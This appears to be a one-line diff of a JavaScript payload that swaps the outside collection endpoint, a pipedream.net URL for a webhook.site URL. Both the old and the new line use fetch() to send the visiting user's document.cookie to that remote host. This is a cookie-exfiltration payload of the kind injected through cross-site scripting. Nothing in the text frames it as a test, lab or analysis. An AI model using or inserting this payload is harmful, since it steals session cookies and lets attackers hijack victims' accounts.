@@ -1,1 +1,1 @@
-fetch("https://enavuprbv62j4.x.pipedream.net/?"+document.cookie);
+fetch("https://webhook.site/613b2ea3-68fa-4911-9d4d-baa95743e686/foo?cookie="+document.cookie);
